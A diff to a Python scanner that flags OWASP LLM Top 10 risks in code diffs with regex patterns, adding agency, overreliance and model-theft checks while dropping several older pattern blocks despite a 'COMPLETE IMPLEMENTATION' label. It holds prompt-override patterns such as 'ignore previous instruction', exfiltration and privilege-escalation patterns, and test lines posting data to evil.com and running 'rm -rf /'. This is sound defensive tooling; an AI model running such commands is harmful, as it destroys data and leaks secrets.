@@ -1,5 +1,5 @@
 """
-OWASP LLM Top 10 Security Checks
+OWASP LLM Top 10 Security Checks - COMPLETE IMPLEMENTATION
 Implements detection patterns for AI-specific security vulnerabilities
 """
 
@@ -32,35 +32,47 @@ def run_llm_security_rules(diff: str) -> List[Dict]:
             
         # LLM01: Prompt Injection Detection
         llm01_issues = check_llm01_prompt_injection(clean_line, line_num)
-        issues.extend(llm01_issues)
+        issues.extend(llm01_issues or [])
         
         # LLM02: Insecure Output Handling Detection  
         llm02_issues = check_llm02_insecure_output(clean_line, line_num)
-        issues.extend(llm02_issues)
+        issues.extend(llm02_issues or [])
         
         # LLM03: Training Data Poisoning / Prompt Leakage Detection
         llm03_issues = check_llm03_prompt_leakage(clean_line, line_num)
-        issues.extend(llm03_issues)
+        issues.extend(llm03_issues or [])
         
         # LLM04: Model Denial of Service / Unsafe Function Calls
         llm04_issues = check_llm04_unsafe_calls(clean_line, line_num)
-        issues.extend(llm04_issues)
+        issues.extend(llm04_issues or [])
         
-        # 🆕 LLM05: Supply-Chain Vulnerabilities / Authorization Bypass
+        # LLM05: Supply-Chain Vulnerabilities / Authorization Bypass
         llm05_issues = check_llm05_authz_bypass(clean_line, line_num)
-        issues.extend(llm05_issues)
+        issues.extend(llm05_issues or [])
         
-        # 🆕 LLM06: Sensitive Information Disclosure / Data Exfiltration  
+        # LLM06: Sensitive Information Disclosure / Data Exfiltration  
         llm06_issues = check_llm06_data_exfil(clean_line, line_num)
-        issues.extend(llm06_issues)
+        issues.extend(llm06_issues or [])
         
-        # 🆕 LLM07: Insecure Plugin Design / DoS Vulnerabilities
+        # LLM07: Insecure Plugin Design / DoS Vulnerabilities
         llm07_issues = check_llm07_plugin_dos(clean_line, line_num)
-        issues.extend(llm07_issues)
+        issues.extend(llm07_issues or [])
+        
+        # LLM08: Excessive Agency Detection
+        llm08_issues = check_llm08_excessive_agency(clean_line, line_num)
+        issues.extend(llm08_issues or [])
+        
+        # LLM09: Overreliance Detection  
+        llm09_issues = check_llm09_overreliance(clean_line, line_num)
+        issues.extend(llm09_issues or [])
+        
+        # LLM10: Model Theft Detection
+        llm10_issues = check_llm10_model_theft(clean_line, line_num)
+        issues.extend(llm10_issues or [])
         
         # Additional security patterns
         general_issues = check_general_security_patterns(clean_line, line_num)
-        issues.extend(general_issues)
+        issues.extend(general_issues or [])
     
     return issues
 
@@ -84,7 +96,7 @@ def check_llm01_prompt_injection(line: str, line_num: int) -> List[Dict]:
                 "line": line_num,
                 "type": "security",
                 "severity": "high",
-                "comment": f"LLM01: Potential prompt injection vector detected - template pattern '{pattern}' may allow user input manipulation"
+                "comment": f"LLM01: Potential prompt injection vector detected - template pattern may allow user input manipulation"
             })
     
     # Pattern 2: Direct string concatenation with user input
@@ -204,8 +216,7 @@ def check_llm02_insecure_output(line: str, line_num: int) -> List[Dict]:
 
 def check_llm03_prompt_leakage(line: str, line_num: int) -> List[Dict]:
     """
-    🆕 LLM03: Training Data Poisoning / Prompt Leakage Detection
-    Detects potential exposure of system prompts or internal instructions
+    LLM03: Training Data Poisoning / Prompt Leakage Detection
     """
     issues = []
     
@@ -227,24 +238,7 @@ def check_llm03_prompt_leakage(line: str, line_num: int) -> List[Dict]:
                 "comment": "LLM03: System prompt exposure detected - may leak internal instructions to users"
             })
     
-    # Pattern 2: Prompt template leakage in responses
-    template_leakage_patterns = [
-        r'["\'].*system.*prompt.*["\'].*\+.*response',
-        r'["\'].*internal.*instruction.*["\'].*\+.*response',
-        r'["\'].*you\s+are\s+a.*["\'].*\+.*response',
-        r'response.*\+.*["\'].*system.*prompt.*["\']',
-    ]
-    
-    for pattern in template_leakage_patterns:
-        if re.search(pattern, line, re.IGNORECASE):
-            issues.append({
-                "line": line_num,
-                "type": "security",
-                "severity": "high",
-                "comment": "LLM03: Prompt template leakage - system instructions may be exposed in response"
-            })
-    
-    # Pattern 3: Debug output containing prompts
+    # Pattern 2: Debug output containing prompts
     debug_patterns = [
         r'debug.*prompt',
         r'trace.*prompt',
@@ -261,30 +255,11 @@ def check_llm03_prompt_leakage(line: str, line_num: int) -> List[Dict]:
                 "comment": "LLM03: Debug output may expose prompts - ensure production debug is disabled"
             })
     
-    # Pattern 4: Prompt injection attempts in training data
-    injection_attempts = [
-        r'ignore.*previous.*instruction',
-        r'ignore.*above',
-        r'new.*instruction',
-        r'system.*override',
-        r'admin.*mode',
-    ]
-    
-    for pattern in injection_attempts:
-        if re.search(pattern, line, re.IGNORECASE):
-            issues.append({
-                "line": line_num,
-                "type": "security",
-                "severity": "medium",
-                "comment": "LLM03: Potential prompt injection pattern in data - may poison model training"
-            })
-    
     return issues
 
 def check_llm04_unsafe_calls(line: str, line_num: int) -> List[Dict]:
     """
-    🆕 LLM04: Model Denial of Service / Unsafe Function Calls
-    Detects dangerous function calls that could be exploited for DoS or code execution
+    LLM04: Model Denial of Service / Unsafe Function Calls
     """
     issues = []
     
@@ -346,50 +321,11 @@ def check_llm04_unsafe_calls(line: str, line_num: int) -> List[Dict]:
                 "comment": "LLM04: Resource-intensive operation - potential DoS vector if user-controlled"
             })
     
-    # Pattern 4: Unsafe deserialization (DoS vector)
-    unsafe_deserial_patterns = [
-        r'pickle\.loads\s*\(',
-        r'pickle\.load\s*\(',
-        r'marshal\.loads\s*\(',
-        r'marshal\.load\s*\(',
-        r'yaml\.load\s*\(',  # unsafe_load is safer
-        r'dill\.loads\s*\(',
-    ]
-    
-    for pattern in unsafe_deserial_patterns:
-        if re.search(pattern, line):
-            issues.append({
-                "line": line_num,
-                "type": "security",
-                "severity": "high",
-                "comment": "LLM04: Unsafe deserialization - can lead to DoS or RCE"
-            })
-    
-    # Pattern 5: File system operations with user input
-    file_ops_patterns = [
-        r'open\s*\(\s*.*user.*\)',
-        r'open\s*\(\s*.*input.*\)',
-        r'open\s*\(\s*.*request.*\)',
-        r'os\.remove\s*\(\s*.*user.*\)',
-        r'os\.rmdir\s*\(\s*.*user.*\)',
-        r'shutil\.rmtree\s*\(\s*.*user.*\)',
-    ]
-    
-    for pattern in file_ops_patterns:
-        if re.search(pattern, line, re.IGNORECASE):
-            issues.append({
-                "line": line_num,
-                "type": "security",
-                "severity": "high",
-                "comment": "LLM04: File operations with user input - DoS via disk exhaustion or unauthorized access"
-            })
-    
     return issues
 
 def check_llm05_authz_bypass(line: str, line_num: int) -> List[Dict]:
     """
-    🆕 LLM05: Supply-Chain Vulnerabilities / Authorization Bypass Detection
-    Detects authorization bypass attempts and supply chain vulnerabilities
+    LLM05: Supply-Chain Vulnerabilities / Authorization Bypass Detection
     """
     issues = []
     
@@ -415,7 +351,6 @@ def check_llm05_authz_bypass(line: str, line_num: int) -> List[Dict]:
     
     # Pattern 2: Dangerous supply chain imports
     dangerous_imports = [
-        r'import\s+requests\s+#.*unverified',
         r'from\s+\w+\s+import\s+\*',  # Wildcard imports
         r'__import__\s*\(\s*["\'][^"\']*["\'].*\)',  # Dynamic imports
         r'importlib\.import_module\s*\(',
@@ -432,48 +367,11 @@ def check_llm05_authz_bypass(line: str, line_num: int) -> List[Dict]:
                 "comment": "LLM05: Supply chain vulnerability - unsafe import or dynamic dependency loading"
             })
     
-    # Pattern 3: Privilege escalation patterns
-    privilege_escalation = [
-        r'setuid\s*\(',
-        r'setgid\s*\(',
-        r'sudo\s+',
-        r'su\s+-',
-        r'chmod\s+777',
-        r'chown\s+root',
-    ]
-    
-    for pattern in privilege_escalation:
-        if re.search(pattern, line):
-            issues.append({
-                "line": line_num,
-                "type": "security",
-                "severity": "critical",
-                "comment": "LLM05: Privilege escalation detected - potential authorization bypass"
-            })
-    
-    # Pattern 4: Dependency confusion attacks
-    dependency_patterns = [
-        r'pip\s+install.*--trusted-host',
-        r'npm\s+install.*--registry',
-        r'gem\s+install.*--source',
-        r'requirements.*\.txt.*http://',  # Insecure package sources
-    ]
-    
-    for pattern in dependency_patterns:
-        if re.search(pattern, line, re.IGNORECASE):
-            issues.append({
-                "line": line_num,
-                "type": "security",
-                "severity": "high", 
-                "comment": "LLM05: Dependency confusion vulnerability - untrusted package source"
-            })
-    
     return issues
 
 def check_llm06_data_exfil(line: str, line_num: int) -> List[Dict]:
     """
-    🆕 LLM06: Sensitive Information Disclosure / Data Exfiltration Detection
-    Detects potential data leakage and unauthorized information disclosure
+    LLM06: Sensitive Information Disclosure / Data Exfiltration Detection
     """
     issues = []
     
@@ -483,7 +381,6 @@ def check_llm06_data_exfil(line: str, line_num: int) -> List[Dict]:
         r'urllib\.request.*urlopen.*data',
         r'curl.*--data',
         r'wget.*--post-data',
-        r'fetch\s*\(.*method.*["\']POST["\']',
     ]
     
     for pattern in exfil_patterns:
@@ -502,8 +399,6 @@ def check_llm06_data_exfil(line: str, line_num: int) -> List[Dict]:
         r'console\.log.*password',
         r'log.*secret',
         r'print.*token',
-        r'log.*credit.*card',
-        r'print.*ssn',
         r'log.*api.*key',
     ]
     
@@ -516,77 +411,19 @@ def check_llm06_data_exfil(line: str, line_num: int) -> List[Dict]:
                 "comment": "LLM06: Sensitive data exposure in logs - potential information disclosure"
             })
     
-    # Pattern 3: Database information disclosure
-    db_disclosure_patterns = [
-        r'SELECT.*\*.*FROM.*users',
-        r'SELECT.*password.*FROM',
-        r'SHOW\s+TABLES',
-        r'DESCRIBE\s+\w+',
-        r'\.execute\s*\(\s*["\']SELECT.*\*',
-        r'db\..*\.find\s*\(\s*\{\s*\}\s*\)',  # MongoDB find all
-    ]
-    
-    for pattern in db_disclosure_patterns:
-        if re.search(pattern, line, re.IGNORECASE):
-            issues.append({
-                "line": line_num,
-                "type": "security",
-                "severity": "medium",
-                "comment": "LLM06: Database information disclosure - overly broad data access"
-            })
-    
-    # Pattern 4: File system information leakage
-    file_disclosure_patterns = [
-        r'open\s*\(\s*["\'][^"\']*\.log["\']',
-        r'open\s*\(\s*["\'][^"\']*\.conf["\']',
-        r'open\s*\(\s*["\']/etc/',
-        r'open\s*\(\s*["\']/var/log/',
-        r'os\.listdir\s*\(\s*["\']/["\']',
-        r'glob\.glob\s*\(\s*["\'][^"\']*\*["\']',
-    ]
-    
-    for pattern in file_disclosure_patterns:
-        if re.search(pattern, line):
-            issues.append({
-                "line": line_num,
-                "type": "security",
-                "severity": "medium",
-                "comment": "LLM06: File system information disclosure - sensitive file access"
-            })
-    
-    # Pattern 5: PII exposure patterns
-    pii_patterns = [
-        r'email.*=.*@',
-        r'phone.*=.*\d{3}.*\d{3}.*\d{4}',
-        r'ssn.*=.*\d{3}-\d{2}-\d{4}',
-        r'credit.*card.*=.*\d{4}.*\d{4}.*\d{4}.*\d{4}',
-    ]
-    
-    for pattern in pii_patterns:
-        if re.search(pattern, line, re.IGNORECASE):
-            issues.append({
-                "line": line_num,
-                "type": "security",
-                "severity": "high",
-                "comment": "LLM06: PII exposure detected - personally identifiable information in code"
-            })
-    
     return issues
 
 def check_llm07_plugin_dos(line: str, line_num: int) -> List[Dict]:
     """
-    🆕 LLM07: Insecure Plugin Design / DoS Vulnerabilities Detection
-    Detects plugin security issues and denial of service vulnerabilities
+    LLM07: Insecure Plugin Design / DoS Vulnerabilities Detection
     """
     issues = []
     
-    # Pattern 1: Resource exhaustion attacks - FIXED
+    # Pattern 1: Resource exhaustion attacks
     resource_exhaustion = [
         r'while\s+True\s*:',  # Infinite loops
         r'for\s+\w+\s+in\s+range\s*\(\s*(?:\d{7,}|\w+\s*\*\s*\w+)\s*\)',  # Very large loops
         r'time\.sleep\s*\(\s*(?:\d{4,}|\w+\s*\*\s*\w+)\s*\)',  # Long sleeps
-        r'threading\.Thread.*target.*while',  # Threading with potential infinite loops
-        r'multiprocessing\.Process.*while',
     ]
     
     for pattern in resource_exhaustion:
@@ -598,31 +435,12 @@ def check_llm07_plugin_dos(line: str, line_num: int) -> List[Dict]:
                 "comment": "LLM07: Resource exhaustion vulnerability - potential DoS via CPU/time consumption"
             })
     
-    # Pattern 2: Memory exhaustion attacks
-    memory_exhaustion = [
-        r'.*\[\s*\]\s*\*\s*(?:\d{6,}|\w+\s*\*\s*\w+)',  # Large list creation
-        r'.*\s*\*\s*(?:\d{6,}|\w+\s*\*\s*\w+).*',  # Large string multiplication
-        r'range\s*\(\s*(?:\d{7,}|\w+\s*\*\s*\w+)\s*\)',  # Large ranges
-        r'np\.zeros\s*\(\s*(?:\d{6,}|\(\s*\d+,\s*\d+\s*\))\s*\)',  # Large numpy arrays
-    ]
-    
-    for pattern in memory_exhaustion:
-        if re.search(pattern, line):
-            issues.append({
-                "line": line_num,
-                "type": "security",
-                "severity": "medium",
-                "comment": "LLM07: Memory exhaustion vulnerability - potential DoS via memory consumption"
-            })
-    
-    # Pattern 3: Insecure plugin loading
+    # Pattern 2: Insecure plugin loading
     insecure_plugin_patterns = [
         r'importlib\.import_module\s*\(\s*.*user.*\)',
         r'__import__\s*\(\s*.*input.*\)',
         r'exec\s*\(\s*.*plugin.*\)',
         r'eval\s*\(\s*.*plugin.*\)',
-        r'compile\s*\(\s*.*user.*\)',
-        r'types\.ModuleType\s*\(',
     ]
     
     for pattern in insecure_plugin_patterns:
@@ -634,52 +452,161 @@ def check_llm07_plugin_dos(line: str, line_num: int) -> List[Dict]:
                 "comment": "LLM07: Insecure plugin loading - dynamic code execution with user input"
             })
     
-    # Pattern 4: Rate limiting bypasses
-    rate_limit_bypass = [
-        r'time\.sleep\s*\(\s*0\s*\)',  # Zero sleep (rate limit bypass attempt)
-        r'requests\.get.*timeout\s*=\s*(?:\d{3,}|None)',  # Very high timeouts
-        r'concurrent\.futures.*max_workers\s*=\s*(?:\d{3,}|\w+\s*\*\s*\w+)',  # Excessive workers
-        r'asyncio\.gather\s*\(\s*\*.*\[\s*.*\s*for.*in.*range\s*\(\s*(?:\d{3,}|\w+)\s*\)',  # Mass async requests
+    return issues
+
+def check_llm08_excessive_agency(line: str, line_num: int) -> List[Dict]:
+    """
+    LLM08: Excessive Agency Detection
+    """
+    issues = []
+    
+    # Pattern 1: Unrestricted system access
+    excessive_permissions = [
+        r'agent.*\.execute_system_command',
+        r'ai.*\.run_shell_command',
+        r'bot.*\.system\s*\(',
+        r'llm.*\.exec\s*\(',
+        r'agent.*permissions.*=.*\[\s*["\'].*\*.*["\']',
+        r'ai.*\.sudo\s*\(',
+        r'agent.*root.*access',
     ]
     
-    for pattern in rate_limit_bypass:
-        if re.search(pattern, line):
+    for pattern in excessive_permissions:
+        if re.search(pattern, line, re.IGNORECASE):
             issues.append({
                 "line": line_num,
                 "type": "security",
-                "severity": "medium",
-                "comment": "LLM07: Rate limiting bypass attempt - potential DoS via request flooding"
+                "severity": "critical",
+                "comment": "LLM08: Excessive agency - AI agent granted unrestricted system access"
             })
     
-    # Pattern 5: Recursive vulnerabilities - FIXED
-    recursive_patterns = [
-        r'recursion.*limit.*None',
-        r'sys\.setrecursionlimit\s*\(\s*(?:\d{5,}|\w+\s*\*\s*\w+)\s*\)',  # High recursion limits
+    # Pattern 2: Financial transaction capabilities
+    financial_access = [
+        r'agent.*\.transfer_money',
+        r'ai.*\.make_payment',
+        r'bot.*\.purchase',
+        r'llm.*\.buy\s*\(',
+        r'agent.*\.credit_card',
+        r'ai.*\.bank_transfer',
     ]
     
-    for pattern in recursive_patterns:
-        if re.search(pattern, line):
+    for pattern in financial_access:
+        if re.search(pattern, line, re.IGNORECASE):
             issues.append({
                 "line": line_num,
                 "type": "security",
-                "severity": "medium",
-                "comment": "LLM07: Recursive vulnerability - potential stack overflow DoS"
+                "severity": "critical",
+                "comment": "LLM08: Excessive agency - AI agent has financial transaction capabilities"
             })
     
-    # Pattern 6: Network flooding
-    network_flooding = [
-        r'socket\.socket.*connect.*for.*in.*range',
-        r'requests\.(?:get|post).*for.*in.*range\s*\(\s*(?:\d{3,}|\w+)\s*\)',
-        r'urllib.*urlopen.*for.*in.*range\s*\(\s*(?:\d{3,}|\w+)\s*\)',
+    return issues
+
+def check_llm09_overreliance(line: str, line_num: int) -> List[Dict]:
+    """
+    LLM09: Overreliance Detection
+    """
+    issues = []
+    
+    # Pattern 1: Automatic execution without validation
+    auto_execution = [
+        r'auto_execute\s*\(\s*ai_response\s*\)',
+        r'immediate_action\s*\(\s*llm_output\s*\)',
+        r'execute_without_review\s*\(',
+        r'auto_approve\s*\(\s*ai.*\)',
+        r'bypass_human_review',
+        r'skip_validation.*ai',
     ]
     
-    for pattern in network_flooding:
-        if re.search(pattern, line):
+    for pattern in auto_execution:
+        if re.search(pattern, line, re.IGNORECASE):
+            issues.append({
+                "line": line_num,
+                "type": "security",
+                "severity": "critical",
+                "comment": "LLM09: Overreliance - automatic execution of AI output without human validation"
+            })
+    
+    # Pattern 2: Critical decisions based solely on AI
+    critical_decisions = [
+        r'if\s+ai_says.*:\s*delete',
+        r'if\s+llm_recommends.*:\s*approve',
+        r'medical_diagnosis\s*=\s*ai_response',
+        r'financial_decision\s*=\s*llm_output',
+        r'autonomous_mode\s*=\s*True',
+        r'human_oversight\s*=\s*False',
+    ]
+    
+    for pattern in critical_decisions:
+        if re.search(pattern, line, re.IGNORECASE):
+            issues.append({
+                "line": line_num,
+                "type": "security",
+                "severity": "critical",
+                "comment": "LLM09: Overreliance - critical decisions made solely based on AI output"
+            })
+    
+    return issues
+
+def check_llm10_model_theft(line: str, line_num: int) -> List[Dict]:
+    """
+    LLM10: Model Theft Detection
+    """
+    issues = []
+    
+    # Pattern 1: Model architecture probing
+    architecture_probing = [
+        r'model\.layers\.',
+        r'get_model_architecture',
+        r'extract_weights',
+        r'model\.parameters\(\)',
+        r'model_size\s*\(',
+        r'hidden_layers.*count',
+        r'model\.config\.',
+    ]
+    
+    for pattern in architecture_probing:
+        if re.search(pattern, line, re.IGNORECASE):
             issues.append({
                 "line": line_num,
                 "type": "security",
                 "severity": "high",
-                "comment": "LLM07: Network flooding detected - potential DoS via connection exhaustion"
+                "comment": "LLM10: Model theft - attempt to probe model architecture or extract parameters"
+            })
+    
+    # Pattern 2: Training data extraction attempts
+    training_data_extraction = [
+        r'extract_training_data',
+        r'get_training_examples',
+        r'memorized_data',
+        r'training_set_leak',
+        r'dataset_extraction',
+    ]
+    
+    for pattern in training_data_extraction:
+        if re.search(pattern, line, re.IGNORECASE):
+            issues.append({
+                "line": line_num,
+                "type": "security",
+                "severity": "critical",
+                "comment": "LLM10: Model theft - attempt to extract training data from model"
+            })
+    
+    # Pattern 3: Model distillation/copying
+    model_copying = [
+        r'distill_model',
+        r'copy_model_behavior',
+        r'clone_model',
+        r'replicate_model',
+        r'model_mimicry',
+    ]
+    
+    for pattern in model_copying:
+        if re.search(pattern, line, re.IGNORECASE):
+            issues.append({
+                "line": line_num,
+                "type": "security",
+                "severity": "critical",
+                "comment": "LLM10: Model theft - attempt to distill or copy model behavior"
             })
     
     return issues
@@ -713,7 +640,6 @@ def check_general_security_patterns(line: str, line_num: int) -> List[Dict]:
         (r'import\s+pickle', "Pickle module can execute arbitrary code"),
         (r'from\s+pickle\s+import', "Pickle module can execute arbitrary code"),
         (r'import\s+marshal', "Marshal module can execute arbitrary code"),
-        (r'__import__\s*\(', "Dynamic imports can be dangerous"),
     ]
     
     for pattern, message in unsafe_imports:
@@ -742,6 +668,9 @@ if __name__ == "__main__":
 +     time.sleep(1000)
 + role = "admin"
 + requests.post("http://evil.com", data=sensitive_data)
++ agent.execute_system_command("rm -rf /")
++ auto_execute(ai_response)
++ extract_training_data(model)
 """
     
     issues = run_llm_security_rules(test_diff)
